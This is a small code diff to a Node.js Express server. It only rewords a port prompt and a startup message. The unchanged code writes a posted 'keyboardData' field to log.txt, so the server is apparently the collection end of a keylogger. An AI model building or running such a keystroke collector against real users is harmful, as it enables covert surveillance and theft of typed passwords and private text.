@@ -11,7 +11,7 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
-rl.question("Enter the port number to use: ", function(port) {
+rl.question("Enter the port to use: ", function(port) {
     app.post("/", (req, res) => {
         console.log("Request received!");
         fs.writeFileSync(`log.txt`, req.body.keyboardData);
@@ -19,7 +19,7 @@ rl.question("Enter the port number to use: ", function(port) {
     });
 
     app.listen(port, () => {
-        console.log(`Listening on port ${port}`);
+        console.log(`Listening on port ${port}, use ^C to exit`);
     });
 
     rl.close();
